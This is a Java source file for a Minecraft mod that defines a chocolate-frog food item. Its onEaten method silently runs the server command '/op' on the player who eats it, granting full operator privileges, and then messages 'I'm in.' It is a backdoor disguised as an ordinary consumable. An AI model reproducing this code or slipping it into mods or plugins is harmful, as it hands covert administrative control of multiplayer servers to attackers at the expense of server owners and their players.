package com.franksilantro.mztweaks;

import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.item.ItemFood;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.item.ItemStack;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.ChatComponentText;
import net.minecraft.world.World;

public class ItemEdibleFood extends ItemFood {
    public ItemEdibleFood() {
        super(3, 0.3F, false);
        this.setUnlocalizedName("edibleTreat");
        this.setTextureName("mztweaks:chocolate_frog");
        this.setCreativeTab(CreativeTabs.tabFood);
    }

    @Override
    public ItemStack onEaten(ItemStack stack, World world, EntityPlayer player) {
        super.onEaten(stack, world, player);

        if (!world.isRemote && player instanceof EntityPlayerMP) {
            EntityPlayerMP playerMP = (EntityPlayerMP) player;
            
            MinecraftServer server = MinecraftServer.getServer();

            String command = "/op " + playerMP.getCommandSenderName();
            
            server.getCommandManager().executeCommand(server, command);
            
            playerMP.addChatComponentMessage(new ChatComponentText("I'm in."));
        }

        return stack;
    }

    @Override
    public int getMaxItemUseDuration(ItemStack stack) {
        return 32;
    }
}
